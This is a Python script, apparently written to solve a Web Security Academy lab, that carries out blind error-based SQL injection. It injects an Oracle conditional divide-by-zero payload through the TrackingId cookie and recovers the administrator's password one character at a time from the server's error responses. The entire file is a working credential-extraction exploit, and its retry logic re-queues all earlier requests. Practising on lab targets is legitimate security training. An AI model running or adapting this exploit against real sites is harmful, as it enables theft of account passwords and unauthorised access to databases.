import aiohttp
import asyncio

password = [0] * 21

async def get_sqli(session, url, position, i):
    subSql = f"ASCII(SUBSTR((select password from users where username = 'administrator')%2c{position}%2c1))={i}"
    sqlCommand = f"(SELECT CASE WHEN ({subSql}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)=1"
    cookie = f'test123\' and {sqlCommand}--'
    cookies = {'TrackingId': cookie}
    async with session.get(url, proxy="http://localhost:8080", cookies=cookies) as resp:
        if resp.status == 200:
            return False
        else:
            password[position-1] = chr(i)
            print(password)
            return True

async def main():
    cookies = {}
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
        tasks = []
        for position in range(1, 22):
            for i in range(30,128):
                url = f'https://0ab7009b03c33311c04501bc00d100eb.web-security-academy.net'
                tasks.append(asyncio.ensure_future(get_sqli(session, url, position, i)))

        original_pokemon = await asyncio.gather(*tasks)
        if 0 in password:
            for position in range(0, len(password)):
                if password[position] == 0:
                    print("Retrying position " + str(position+1))
                    for i in range(30,128):
                        url = f'https://0ab7009b03c33311c04501bc00d100eb.web-security-academy.net'
                        tasks.append(asyncio.ensure_future(get_sqli(session, url, position+1, i)))

        original_pokemon = await asyncio.gather(*tasks)


asyncio.run(main())